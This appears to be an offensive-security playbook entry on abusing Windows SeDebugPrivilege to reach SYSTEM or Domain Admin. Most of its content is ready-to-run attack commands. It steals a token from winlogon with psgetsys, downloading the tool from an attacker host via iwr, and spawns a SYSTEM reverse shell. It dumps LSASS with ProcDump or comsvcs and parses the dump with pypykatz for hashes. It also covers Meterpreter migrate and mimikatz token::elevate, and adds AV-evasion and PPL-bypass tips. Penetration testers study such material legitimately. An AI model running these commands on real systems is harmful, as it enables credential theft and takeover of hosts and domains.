title: SeDebugPrivilege — Abuse to SYSTEM / LSASS
body: SeDebugPrivilege is full debugger authority over every process on the host — you can open, read, write, and duplicate the token of ANY process, including SYSTEM-owned ones. Four routes to abuse it: duplicate a SYSTEM process's token to spawn SYSTEM directly (psgetsystem — no mimikatz), dump LSASS with a signed tool and parse offline for everyone's hashes, migrate a Meterpreter session into a SYSTEM process, or use mimikatz token::elevate. On a Domain Controller it's effectively Domain Admin (LSASS holds the DA's credentials). Key caveat: if LSA Protection (RunAsPPL) is enabled you can't touch LSASS even with SeDebug — steal a non-PPL SYSTEM token instead. Disabled state doesn't matter; it's enabled at use time.
cmd:
# ⭐ PATH: steal a SYSTEM process's token (psgetsys) → SYSTEM. No mimikatz needed.
#         Or dump LSASS → parse on Kali for everyone's hashes (incl. DA on a DC).

# ══ ⭐ HAVE SeDebugPrivilege? — it's debugger authority over EVERY process ══
# = open/read/write/duplicate the token of ANY process, including SYSTEM-owned.
# Four independent routes below. On a DC this is effectively Domain Admin
# (LSASS holds the DA's creds; a winlogon token = SYSTEM on the DC).
# Disabled != absent — the tool/priv is enabled at use time.
whoami /priv | findstr /i SeDebug

# ══════════════════════════════════════════════════════
# A) TOKEN DUPLICATION — inherit a SYSTEM process's token  (primary, no mimikatz)
# ══════════════════════════════════════════════════════
# The core SeDebug primitive: spawn a child that inherits a SYSTEM parent's token.
# 1) find a SYSTEM-owned PID (winlogon is the classic non-PPL target):
tasklist /v | findstr /i "winlogon"        # or: Get-Process winlogon | select Id
# 2) psgetsys.ps1 (github.com/decoder-it/psgetsystem) — impersonate that parent:
iwr http://$lhost/psgetsys.ps1 -OutFile psgetsys.ps1 ; . .\psgetsys.ps1
ImpersonateFromParentPid -ppid <winlogon-pid> -command "cmd.exe" -cmdargs ""
# or spawn a reverse shell as SYSTEM:
ImpersonateFromParentPid -ppid <winlogon-pid> -command "C:\Windows\Temp\shell.exe" -cmdargs ""

# ══════════════════════════════════════════════════════
# B) LSASS DUMP → offline creds  (signed tool, AV-safe)
# ══════════════════════════════════════════════════════
# ProcDump = Microsoft-signed, rarely flagged:
.\procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp
# or comsvcs.dll — LOLBIN, nothing to upload:
Get-Process lsass | select -Expand Id
rundll32 C:\Windows\System32\comsvcs.dll, MiniDump <lsass-pid> C:\Windows\Temp\lsass.dmp full
# parse on KALI (don't run sekurlsa on-box if AV is hot):
pypykatz lsa minidump lsass.dmp            # -> NTLM hashes -> pass-the-hash / crack
# ** PPL CAVEAT: if LSA Protection (RunAsPPL) is on, LSASS is unreadable even with
#    SeDebug — procdump/rundll32 return ACCESS DENIED. Then use route A (steal a
#    non-PPL SYSTEM token like winlogon) or a PPL bypass (BYOVD). Don't keep retrying B. **

# ══════════════════════════════════════════════════════
# C) METERPRETER — migrate into a SYSTEM process
# ══════════════════════════════════════════════════════
meterpreter > ps                           # find winlogon.exe PID (SYSTEM)
meterpreter > migrate <winlogon-pid>       # SeDebug lets you migrate into it
meterpreter > getuid                       # NT AUTHORITY\SYSTEM

# ══════════════════════════════════════════════════════
# D) MIMIKATZ token::elevate  (the mimikatz way)
# ══════════════════════════════════════════════════════
.\mimikatz.exe "privilege::debug" "token::elevate" "token::run /program:cmd.exe" "exit"
# token::elevate steals a SYSTEM token; token::run spawns as it. AV flags this on disk.

# ── PICK / GOTCHAS ───────────────────────────────────
# - Want SYSTEM cleanly, no AV noise -> A (token dup) or C (migrate).
# - Want everyone's creds / the DA hash -> B (LSASS dump, parse on Kali).
# - LSASS PPL-protected -> B fails; fall back to A.
# - On a DC: SeDebug == Domain Admin. Dump LSASS for the DA hash, or SYSTEM via A.
warn: SeDebug is top-tier and has FOUR routes — don't stop at mimikatz. Token duplication (psgetsys, route A) and Meterpreter migrate (C) give clean SYSTEM with no cred-store touch and no AV noise; LSASS dump (B) with a SIGNED tool (ProcDump/comsvcs) parsed on Kali gets everyone's hashes. BIG GOTCHA: LSA Protection / RunAsPPL makes LSASS unreadable even with SeDebug (procdump = ACCESS DENIED) — fall back to token duplication, don't keep hammering the dump. On a DC, SeDebug = Domain Admin.

choices.label: Dumped LSASS — crack / pass-the-hash the creds
LSASS is PPL-protected — need another token
